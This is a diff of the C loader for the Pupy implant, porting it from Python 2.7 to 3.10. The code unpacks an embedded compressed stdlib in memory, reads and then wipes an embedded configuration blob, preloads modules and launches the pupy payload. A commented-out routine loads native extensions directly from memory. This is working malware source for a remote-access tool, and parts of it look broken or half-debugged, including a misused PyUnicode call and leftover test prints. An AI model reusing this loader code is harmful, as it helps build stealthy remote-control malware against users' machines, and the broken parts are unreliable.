@@ -1,7 +1,7 @@
 /* **************** Python-dynload.c **************** */
-
 #include "Python-dynload.h"
 #include "Python-dynload-os.h"
+
 
 typedef struct dependency {
     const char* name;
@@ -15,26 +15,37 @@ struct py_imports py_sym_table[] = {
     { NULL, NULL }, /* sentinel */
 };
 
-static char __config__[262144] = "####---PUPY_CONFIG_COMES_HERE---####\n";
+static char __config__[500000] = "####---PUPY_CONFIG_COMES_HERE---####\n";
+
 static PyGILState_STATE restore_state;
 static BOOL is_initialized = FALSE;
+static const PyObject *py_stdlib_G = NULL;
 
 /* Likely-to-be-used modules */
 static const char *preload_modules[] = {
-    "__future__",
-    "codecs",
     "types",
-    "linecache",
-    "traceback",
+    //"linecache",
+    "codecs",
+
     "_weakrefset",
+    "_py_abc",
     "abc",
+    "__future__",
+    "warnings",
+    "importlib._bootstrap",
+    "sre_constants",
+    "sre_parse",
+    "sre_compile",
+    "struct",
     ENCODINGS ".aliases",
+
     NULL
 };
 
 #include "lzmaunpack.c"
 #include "library.c"
 
+static PyObject* py_module_from_stdlib(PyObject *py_stdlib, const char *name, int is_init);
 
 static HMODULE xz_dynload(const char *libname, const char *xzbuf, size_t xzsize, void *arg) {
     HMODULE hModule;
@@ -68,6 +79,49 @@ static HMODULE xz_dynload(const char *libname, const char *xzbuf, size_t xzsize,
     return hModule;
 }
 
+PyObject* load_stdlib() {
+	if(py_stdlib_G == NULL) {
+		PyObject *py_stdlib;
+		dprint("Stdlib size: %d\n", library_c_size);
+		py_stdlib = PyDict_lzmaunpack(library_c_start, library_c_size);
+		if (!py_stdlib) {
+			dprint("load_stdlib: PyDict_lzmaunpack() -> Error unpacking py_stdlib\n");
+			return NULL;
+		}
+		Py_IncRef(py_stdlib);
+
+		dprint("Stdlib unpacked: %p\n", py_stdlib);
+		py_stdlib_G = py_stdlib;
+
+		dprint("Unmap stdlib..\n");
+		OSUnmapRegion(library_c_start, library_c_size);
+		dprint("Unmap stdlib.. done\n");
+		return py_stdlib;
+	} else {
+		dprint("stdlib already loaded\n");
+		return py_stdlib_G;
+	}
+}
+
+static
+size_t last_chr_offt(const char *cstr, char chr) {
+    int found_any = 0;
+    size_t last_found = 0;
+    size_t offt;
+
+    for (offt=0; cstr && cstr[offt]; offt++) {
+        if (cstr[offt] == chr) {
+            found_any = 1;
+            last_found = offt;
+        }
+    }
+
+    if (found_any)
+        return last_found;
+    else
+        return offt;
+}
+
 
 BOOL initialize_python(int argc, char *argv[], BOOL is_shared_object) {
     HMODULE hPython = NULL;
@@ -82,9 +136,8 @@ BOOL initialize_python(int argc, char *argv[], BOOL is_shared_object) {
     if (is_initialized) {
         return TRUE;
     }
-
 #ifdef DEBUG_USE_OS_PYTHON
-    hPython = OSLoadLibrary("libpython2.7.so.1.0");
+    hPython = OSLoadLibrary("python310.dll");
     resolver = OSResolveSymbol;
 #else
     for (dependency=dependencies; !hPython; dependency ++) {
@@ -131,23 +184,105 @@ BOOL initialize_python(int argc, char *argv[], BOOL is_shared_object) {
         }
     }
 
-    PyEval_InitThreads();
+
+
+    dprint("Initializing Path & Flags ...\n");
     if(!Py_IsInitialized()) {
-        char * ppath = Py_GetPath();
+        dprint("Py not initialized yet\n");
+       
+        dprint("Setting python flags ...\n");
+        char * pgm = OSGetProgramName();
+        wchar_t wtext[PATH_MAX];
+        mbstowcs(wtext, pgm, strlen(pgm)+1);//Plus null
+
+        //wchar_t * path= "";
+        Py_SetProgramName(wtext);
+        //wchar_t libfilename[PATH_MAX];
+        //GetModuleFileNameW(NULL, libfilename, sizeof(libfilename));
+        //dprint("libfilename: %S\n",libfilename);
+        wchar_t *wchar_paths = Py_DecodeLocale(".", NULL);
+        Py_SetPath(wchar_paths);
+        
+        /* 
+        wchar_t * ppath = Py_GetPath();
         if (ppath)
             memset(ppath, '\0', strlen(ppath));
+        */
+        
+	    PyStatus status;
 
-        Py_FileSystemDefaultEncoding = FILE_SYSTEM_ENCODING;
-        Py_IgnoreEnvironmentFlag = 1;
-        Py_NoSiteFlag = 1;
-        Py_NoUserSiteDirectory = 1;
+		PyPreConfig preconfig;
+
+        dprint("init python preconfig\n");
+        /*
+		typedef void (CALLBACK* PyPreConfig_InitPythonConfigT)(PyPreConfig *);
+		PyPreConfig_InitPythonConfigT PyPreConfig_InitPythonConfig;
+        (PyPreConfig_InitPythonConfigT)PyPreConfig_InitPythonConfig = MyGetProcAddress(hPython, "PyPreConfig_InitPythonConfig");
+        */
+		PyPreConfig_InitPythonConfig(&preconfig);
+		//preconfig.legacy_windows_fs_encoding = 0;
+		//preconfig.isolated = 0;
+        preconfig.use_environment = 0;
+		//preconfig.utf8_mode = 1;
+	
+        dprint("call preinitialize\n");
+		Py_PreInitialize(&preconfig);
+
+		
+		
+		PyConfig config;
+		//typedef void (CALLBACK* PyConfig_InitPythonConfigT)(PyConfig *);
+        //(PyConfig_InitPythonConfigT)PyConfig_InitPythonConfig = MyGetProcAddress(hPython, "PyConfig_InitPythonConfig");
+		
+        dprint("init python config\n");
+		PyConfig_InitPythonConfig(&config);
+        
+		config._init_main = 0;
+		config.isolated = 0;
+        config.site_import = 0;
+        config.user_site_directory = 0;
+        config.write_bytecode = 0;
+        
+
+        dprint("Py_InitializeFromConfig\n");
+
+		status = Py_InitializeFromConfig(&config);
+
+
+
+        /*
+        Py_IsolatedFlag = 1;
         Py_OptimizeFlag = 2;
+        Py_UnbufferedStdioFlag = 1;
+        Py_FileSystemDefaultEncoding = FILE_SYSTEM_ENCODING;
+        Py_NoSiteFlag = 1;
         Py_DontWriteBytecodeFlag = 1;
+        Py_NoUserSiteDirectory = 1;
+        Py_IgnoreEnvironmentFlag = 1;
+       
+        
+        */
 
-        Py_SetProgramName(OSGetProgramName());
-        Py_InitializeEx(is_shared_object? 0 : 1);
+        //int * Py_IsolatedFlagPTR = (int *)MyGetProcAddress(hPython, "Py_IsolatedFlag");
+        //*Py_IsolatedFlagPTR = 1;
+
+		//PyConfig_Clear(&config);
+
+		
+        //Py_Initialize();
+        //Py_InitializeEx(is_shared_object? 0 : 1);
+        dprint("done\n");
+
+
+        
+        
+
+        dprint("calling PyEval_InitThreads\n");
+        PyEval_InitThreads();
     }
 
+
+    dprint("calling PyGILState_Ensure\n");
     restore_state = PyGILState_Ensure();
 
     py_empty_list = PyList_New(0);
@@ -157,6 +292,7 @@ BOOL initialize_python(int argc, char *argv[], BOOL is_shared_object) {
     }
 
     PySys_SetObject("path", py_empty_list);
+    
 
     dprint("SET ARGV (ARGC=%d; SHARED? %d)\n", argc, is_shared_object);
 
@@ -179,15 +315,15 @@ BOOL initialize_python(int argc, char *argv[], BOOL is_shared_object) {
     Py_IncRef(py_argv);
 
     for (i = 0; i<argc && argv[i]; i++) {
-        PyList_Append(py_argv, PyString_FromString(argv[i]));
+        PyList_Append(py_argv, PyUnicode_FromString(argv[i]));
     }
 
-    PySys_SetObject("executable", PyString_FromString(OSGetProgramName()));
+    PySys_SetObject("executable", PyUnicode_FromString(OSGetProgramName()));
     PySys_SetObject("argv", py_argv);
 
     Py_DecRef(py_argv);
 
-    setup_jvm_class();
+    //setup_jvm_class();
 
     dprint("Python initialized\n");
     return TRUE;
@@ -196,24 +332,6 @@ lbExit1:
     return FALSE;
 }
 
-static
-size_t last_chr_offt(const char *cstr, char chr) {
-    int found_any = 0;
-    size_t last_found = 0;
-    size_t offt;
-
-    for (offt=0; cstr && cstr[offt]; offt++) {
-        if (cstr[offt] == chr) {
-            found_any = 1;
-            last_found = offt;
-        }
-    }
-
-    if (found_any)
-        return last_found;
-    else
-        return offt;
-}
 
 static
 PyObject *py_eval_package_init(
@@ -250,7 +368,7 @@ PyObject *py_eval_package_init(
     new_module_dict = PyModule_GetDict(new_module);
 
     PyObject_SetAttrString(
-        new_module, "__file__", PyString_FromString(vpath));
+        new_module, "__file__", PyUnicode_FromString(vpath));
 
     dprint(
         "py_eval_package_init(%s) %p.__file__ = %s\n",
@@ -265,7 +383,7 @@ PyObject *py_eval_package_init(
         Py_ssize_t name_len = strlen(name);
 
         PyObject_SetAttrString(
-            new_module, "__package__", PyString_FromString(name)
+            new_module, "__package__", PyUnicode_FromString(name)
         );
 
         dprint(
@@ -282,8 +400,7 @@ PyObject *py_eval_package_init(
         while (PyDict_Next(modules, &pos, &key, &value)) {
             const char *modname = NULL;
             Py_ssize_t modname_len = 0;
-
-            if (PyString_AsStringAndSize(key, &modname, &modname_len) < 0) {
+            if (PyUnicode_FromStringAndSize(key, &modname, &modname_len) < 0) {
                 dprint(
                     "py_eval_package_init(%s) :: key at %d is not a string\n",
                     name, pos
@@ -291,6 +408,7 @@ PyObject *py_eval_package_init(
 
                 PyErr_Clear();
             }
+            modname = PyUnicode_AsUTF8AndSize(key, &modname_len);
 
             if (! (modname && modname_len)) {
                 dprint(
@@ -299,7 +417,11 @@ PyObject *py_eval_package_init(
                 );
                 continue;
             }
-
+            dprint("modname: %s modname_len: %d name_len: %d\n", modname, modname_len, name_len );
+            
+            if (strncmp("pupy.", modname, 5)) {
+                continue;
+             }
             if (modname_len < name_len + 2)
                 continue;
 
@@ -319,13 +441,13 @@ PyObject *py_eval_package_init(
             );
         }
     } else if (last_dm) {
-        PyObject *py_tmp = PyString_FromStringAndSize(
+        PyObject *py_tmp = PyUnicode_FromStringAndSize(
             name, last_dm
         );
 
         dprint(
             "py_eval_package_init(%s) %p.__package__ = %s\n",
-            name, new_module, PyString_AsString(py_tmp)
+            name, new_module, PyUnicode_AsUTF8(py_tmp)
         );
 
         PyObject_SetAttrString(
@@ -340,7 +462,7 @@ PyObject *py_eval_package_init(
 
         last_dm += sizeof(VPATH_PREFIX);
 
-        py_vpath = PyString_FromStringAndSize(
+        py_vpath = PyBytes_FromStringAndSize(
             vpath, last_dm);
 
         PyObject_SetAttrString(
@@ -350,11 +472,15 @@ PyObject *py_eval_package_init(
 
         dprint(
             "py_eval_package_init(%s) %p.__path__ = [%s] (refs=%d)\n",
-            name, new_module, PyString_AsString(py_vpath), Py_RefCnt(py_vpath)
+            name, new_module, PyBytes_AsString(py_vpath), Py_RefCnt(py_vpath)
         );
     }
 
-    builtins = PyEval_GetBuiltins();
+    //builtins = PyEval_GetBuiltins();
+    builtins = PyImport_Import(PyUnicode_FromString("builtins"));
+    if (!builtins) {
+        dprint("py_eval_package_init(%s) : could not import builtins module\n", name);
+    }
     Py_IncRef(builtins);
     PyDict_SetItemString(new_module_dict, "__builtins__", builtins);
 
@@ -394,8 +520,113 @@ PyObject *py_eval_package_init(
     return new_module;
 }
 
-static
-PyObject* py_module_from_stdlib(PyObject *py_stdlib, const char *name, int is_init) {
+/*
+BOOL load_c_extension_from_stdlib(PyObject *py_stdlib, const char *name) {
+    PyObject *pybody = NULL;
+    char *pybody_c_ptr = NULL;
+    Py_ssize_t pybody_c_size = 0;
+    char * vpath_name;
+    char * func_name;
+    size_t vpath_len;
+    BOOL result = TRUE;
+    
+    vpath_len = strlen(name) + 5;
+    vpath_name = (char *) OSAlloc(vpath_len);
+    if (!vpath_name)
+        goto lbMemFailure1;
+    func_name = (char *) OSAlloc(vpath_len+10);
+    if (!vpath_name)
+        goto lbMemFailure1;
+
+    memset(vpath_name, '\0', vpath_len);
+    strcat(vpath_name, name);
+#ifdef _WIN32
+    strcat(vpath_name, ".pyd");
+#else
+    strcat(vpath_name, ".so");
+#endif
+
+    memset(func_name, '\0', vpath_len+10);
+    strcat(func_name, "PyInit_");
+    strcat(func_name, name);
+
+    dprint("loading C extension from stdlib: %s\n", vpath_name);
+
+    pybody = PyDict_GetItemString(py_stdlib, vpath_name);
+    if (!pybody) {
+        dprint(
+            "load_c_extension_from_stdlib(%s) -> %s not found in stdlib\n",
+            name, vpath_name
+        );
+
+        PyErr_SetString(PyExc_ImportError, name);
+        result = FALSE;
+        goto lbFreeVpath;
+    }
+
+    HMODULE hModule = CheckLibraryLoaded(vpath_name);
+    if (hModule) {
+        dprint("library %s already loaded\n", vpath_name);
+        return FALSE;
+    }
+
+
+    if (PyBytes_AsStringAndSize(pybody, &pybody_c_ptr, &pybody_c_size) == -1) {
+        dprint(
+            "load_c_extension_from_stdlib(%s) -> %s -> Invalid type?\n",
+            name, vpath_name
+        );
+        result = FALSE;
+        goto lbFreeVpath;
+    }
+
+#ifdef _WIN32
+    if(!(pybody_c_ptr[0]=='M' && pybody_c_ptr[1]=='Z')) {
+        dprint("extension %s is not a PE ??\n", vpath_name);
+        goto lbFreeVpath;
+    }
+#endif
+
+    ULONG_PTR cookie = 0;
+
+    cookie = _My_ActivateActCtx();
+    hModule = MemLoadLibrary(
+        vpath_name, pybody_c_ptr, pybody_c_size, NULL
+    );
+    _My_DeactivateActCtx(cookie);
+    if (!hModule) {
+        dprint("MemLoadLibrary( %s ) failed\n", vpath_name);
+        result = FALSE;
+        goto lbFreeVpath;
+    }
+
+    char * oldcontext = _Py_PackageContext;
+    _Py_PackageContext = name;
+
+    typedef FARPROC (*PyInitT)(void);
+    PyInitT PyInitF;
+    PyInitF = (PyInitT)MemResolveSymbol(hModule, func_name);
+    PyInitF();
+
+    _Py_PackageContext = oldcontext;
+    if (PyErr_Occurred())
+        result=FALSE;
+    //PyImport_AppendInittab(name, func_name);
+
+    lbFreeVpath:
+        OSFree(vpath_name);
+        OSFree(func_name);
+
+    return result;
+
+    lbMemFailure1:
+        return PyErr_NoMemory();
+}
+*/
+
+
+
+static PyObject* py_module_from_stdlib(PyObject *py_stdlib, const char *name, int is_init) {
     PyObject *module = NULL;
     PyObject *pybody = NULL;
     PyObject *pybytecode = NULL;
@@ -456,13 +687,13 @@ PyObject* py_module_from_stdlib(PyObject *py_stdlib, const char *name, int is_in
         name, is_init, path_name, pybody
     );
 
-    if (PyString_AsStringAndSize(pybody, &pybody_c_ptr, &pybody_c_size) == -1) {
+    if (PyBytes_AsStringAndSize(pybody, &pybody_c_ptr, &pybody_c_size) == -1) {
         dprint(
             "py_module_from_library(%s, %d) -> %s -> Invalid type?\n",
             name, is_init, path_name
         );
 
-        goto lbFreeVpath;
+    goto lbFreeVpath;
     }
 
     dprint(
@@ -501,7 +732,8 @@ PyObject* py_module_from_stdlib(PyObject *py_stdlib, const char *name, int is_in
 
     dprint("py_module_from_library(%s, %d) -> %p\n", name, is_init, module);
 
-    PyDict_DelItemString(py_stdlib, path_name);
+    //TODO: fix that
+    //PyDict_DelItemString(py_stdlib, path_name);
 
 lbFreePyBytecode:
     Py_DecRef(pybytecode);
@@ -577,30 +809,35 @@ void run_pupy() {
 
     PyObject *py_config_list;
     PyObject *py_pupylib;
-    PyObject *py_stdlib;
-    PyObject *py_stdlib_keys;
-    PyObject *py_stdlib_keys_iter;
-    PyObject *py_stdlib_keys_item;
     PyObject *pupy_dict;
     PyObject *py_debug;
     PyObject *py_main;
     PyObject *py_eval_result;
     PyObject *py_config = NULL;
 
+	PyObject *py_stdlib = load_stdlib();
     const char **preload_module = NULL;
+    PyObject *py_stdlib_keys;
+    PyObject *py_stdlib_keys_iter;
+    PyObject *py_stdlib_keys_item;
+    PyStatus status;
 
-    dprint("Clean sys defaults\n");
 
-    py_clear_sys_list("path");
-    py_clear_sys_list("meta_path");
-    py_clear_sys_list("path_hooks");
-    py_clear_sys_dict("path_importer_cache");
+    PySys_SetObject("frozen", PyBool_FromLong(1));
 
+    
+    
     dprint("Load config\n");
+    dprint("config:");
+    int i;
+    for (i=0; i<5; i++) {
+        dprint("%x", __config__[i]);
+    }
     len.c[3] = __config__[0];
     len.c[2] = __config__[1];
     len.c[1] = __config__[2];
     len.c[0] = __config__[3];
+    dprint("\n");
 
     if (len.l == 0x23232323) {
         dprint("Config not found\n");
@@ -620,18 +857,8 @@ void run_pupy() {
     dprint("Cleanup config\n");
     memset(__config__, 0xFF, len.l + 4);
 
-    dprint("Stdlib size: %d\n", library_c_size);
-    py_stdlib = PyDict_lzmaunpack(library_c_start, library_c_size);
-    if (!py_stdlib) {
-        goto lbExit2;
-    }
-
-    dprint("Stdlib unpacked: %p\n", py_stdlib);
-
-    dprint("Unmap stdlib..\n");
-    OSUnmapRegion(library_c_start, library_c_size);
+    dprint("Unmap config");
     OSUnmapRegion(__config__, len.l);
-    dprint("Unmap stdlib.. done\n");
 
     py_config = PyList_GetItem(py_config_list, 0);
     dprint("Get config: %p\n", py_config);
@@ -644,54 +871,152 @@ void run_pupy() {
 
     Py_IncRef(py_config);
 
-    dprint("Preload basic modules\n");
+    
     for (preload_module=preload_modules; *preload_module; preload_module ++) {
         if (!py_module_from_stdlib(py_stdlib, *preload_module, 0))
             goto lbExit4;
     }
 
+    // the order of loading matters here
+    //
+    if (!py_module_from_stdlib(py_stdlib, "keyword", 0))
+        goto lbExit4;
+    if (!py_module_from_stdlib(py_stdlib, "operator", 0))
+        goto lbExit4;
+    if (!py_module_from_stdlib(py_stdlib, "reprlib", 0))
+        goto lbExit4;
+    
+    if (!py_module_from_stdlib(py_stdlib, "_collections_abc", 0))
+        goto lbExit4;
+    
+    if (!py_module_from_stdlib(py_stdlib, "collections.abc", 0))
+        goto lbExit4;
+    if (!py_module_from_stdlib(py_stdlib, "collections", 1))
+        goto lbExit4;
+    
+    if (!py_module_from_stdlib(py_stdlib, "functools", 0))
+        goto lbExit4;
+    if (!py_module_from_stdlib(py_stdlib, "contextlib", 0))
+        goto lbExit4;
+
+
     if (!py_module_from_stdlib(py_stdlib, ENCODINGS, 1))
         goto lbExit4;
 
-    dprint("Preload encodings\n");
-    py_stdlib_keys = PyDict_Keys(py_stdlib);
-    if (!py_stdlib_keys)
+    if (!py_module_from_stdlib(py_stdlib, "datetime", 0))
         goto lbExit4;
-
-    py_stdlib_keys_iter = PyObject_GetIter(py_stdlib_keys);
-    if (!py_stdlib_keys_iter) {
-        Py_DecRef(py_stdlib_keys);
+    if (!py_module_from_stdlib(py_stdlib, "io", 0))
         goto lbExit4;
+    if (!py_module_from_stdlib(py_stdlib, "umsgpack", 0))
+        goto lbExit4;
+    if (!py_module_from_stdlib(py_stdlib, "copyreg", 0))
+        goto lbExit4;
+    if (!py_module_from_stdlib(py_stdlib, "enum", 0))
+        goto lbExit4;
+    if (!py_module_from_stdlib(py_stdlib, "re", 0))
+        goto lbExit4;
+    if (!py_module_from_stdlib(py_stdlib, "_compat_pickle", 0))
+        goto lbExit4;
+    if (!py_module_from_stdlib(py_stdlib, "pickle", 0))
+        goto lbExit4;
+    if (!py_module_from_stdlib(py_stdlib, "quopri", 0))
+           goto lbExit4;
+
+    if (!py_module_from_stdlib(py_stdlib, "importlib", 1))
+        goto lbExit4;
+    if (!py_module_from_stdlib(py_stdlib, "importlib._abc", 0))
+        goto lbExit4;
+    if (!py_module_from_stdlib(py_stdlib, "importlib.util", 0))
+        goto lbExit4;
+    //if (!py_module_from_stdlib(py_stdlib, "pupy.utils", 0))
+    //    goto lbExit4;
+    
+    
+    
+    
+    
+    //if (!py_module_from_stdlib(py_stdlib, "stringprep", 0))
+    //    goto lbExit4;
+ //   if (!py_module_from_stdlib(py_stdlib, "io", 0))
+ //       goto lbExit4;
+  /*  if (!py_module_from_stdlib(py_stdlib, "re", 0))
+        goto lbExit4;
+    if (!py_module_from_stdlib(py_stdlib, "base64", 0))
+        goto lbExit4;
+    if (!py_module_from_stdlib(py_stdlib, "bz2", 0))
+        goto lbExit4;
+  */
+		
+		dprint("Preload encodings\n");
+		
+		py_stdlib_keys = PyDict_Keys(py_stdlib);
+		if (!py_stdlib_keys)
+			goto lbExit1;
+
+		py_stdlib_keys_iter = PyObject_GetIter(py_stdlib_keys);
+		if (!py_stdlib_keys_iter) {
+			Py_DecRef(py_stdlib_keys);
+			goto lbExit1;
+		}
+
+		while ((py_stdlib_keys_item = PyIter_Next(py_stdlib_keys_iter))) {
+			char *filepath;
+			Py_ssize_t filepath_len;
+			filepath = PyUnicode_AsUTF8AndSize(py_stdlib_keys_item, &filepath_len);
+			if (!filepath) {
+				PyErr_Clear();
+			} else if (strstr(filepath, ENCODINGS "/") == filepath &&
+				strstr(filepath, ENCODINGS "/" VPATH_INIT_EXT) != filepath) {
+				char *child = strdup(filepath);
+				child[last_chr_offt(child, '.')] = '\0';
+				child[sizeof(ENCODINGS) - 1] = '.';
+
+				if (!py_module_from_stdlib(py_stdlib, child, 0)) {
+					dprint("Load encoding: %s (%s): failed\n", child, filepath);
+					PyErr_Clear();
+				} else {
+					dprint("Loaded encoding: %s\n", child);
+				}
+
+				free(child);
+			}
+
+			Py_DecRef(py_stdlib_keys_item);
+		}
+		Py_DecRef(py_stdlib_keys_iter);
+
+
+
+    dprint("Calling _Py_InitializeMain() ...\n");
+    status = _Py_InitializeMain();
+ /*   if (PyStatus_Exception(status)) {
+        dprint("Error calling _Py_InitializeMain\n");
+        Py_ExitStatusException(status);
     }
+   */ 
+    dprint("Clean sys defaults\n");
 
-    while ((py_stdlib_keys_item = PyIter_Next(py_stdlib_keys_iter))) {
-        char *filepath;
-        Py_ssize_t filepath_len;
+    py_clear_sys_list("path");
+    //py_clear_sys_list("meta_path");
+    //py_clear_sys_list("path_hooks");
+    
+    //mandatory !!
+    py_clear_sys_dict("path_importer_cache");
 
-        if (PyString_AsStringAndSize(
-                py_stdlib_keys_item, &filepath, &filepath_len) == -1) {
-            /* Something unexpected. Who cares */
-            PyErr_Clear();
-        } else if (strstr(filepath, ENCODINGS "/") == filepath &&
-            strstr(filepath, ENCODINGS "/" VPATH_INIT_EXT) != filepath) {
-            char *child = strdup(filepath);
-            child[last_chr_offt(child, '.')] = '\0';
-            child[sizeof(ENCODINGS) - 1] = '.';
-
-            if (!py_module_from_stdlib(py_stdlib, child, 0)) {
-                dprint("Load encoding: %s (%s): failed\n", child, filepath);
-                PyErr_Clear();
-            } else {
-                dprint("Loaded encoding: %s\n", child);
-            }
-
-            free(child);
-        }
-
-        Py_DecRef(py_stdlib_keys_item);
+    int res = PyRun_SimpleString(
+        "import sys;"
+        "print('Run Python code', "
+               "file=sys.stderr)");
+    if (res < 0) {
+        exit(1);
     }
-
-    Py_DecRef(py_stdlib_keys_iter);
+    res = PyRun_SimpleString(
+        "import _pupy;"
+        "print(_pupy, "
+               "file=sys.stderr)");
+    if (res < 0) {
+        exit(1);
+    }
 
     dprint("Loading pupy\n");
     pupy = py_module_from_stdlib(py_stdlib, "pupy", 1);
@@ -719,6 +1044,7 @@ void run_pupy() {
 
     Py_IncRef(py_main);
     Py_IncRef(Py_None);
+    Py_IncRef(py_debug);
 
     py_eval_result = PyObject_CallFunctionObjArgs(
         py_main, Py_None, py_debug, py_config, py_stdlib, NULL);
@@ -731,6 +1057,7 @@ void run_pupy() {
 
     Py_DecRef(py_main);
     Py_DecRef(Py_None);
+    Py_DecRef(py_debug);
 
     dprint("Completed (py_eval_result: %p)\n", py_eval_result);
 
@@ -741,7 +1068,7 @@ lbExit3:
     Py_DecRef(py_config_list);
 
 lbExit2:
-    Py_DecRef(py_stdlib);
+    //Py_DecRef(py_stdlib);
 
 lbExit1:
     dprint("Exit\n");
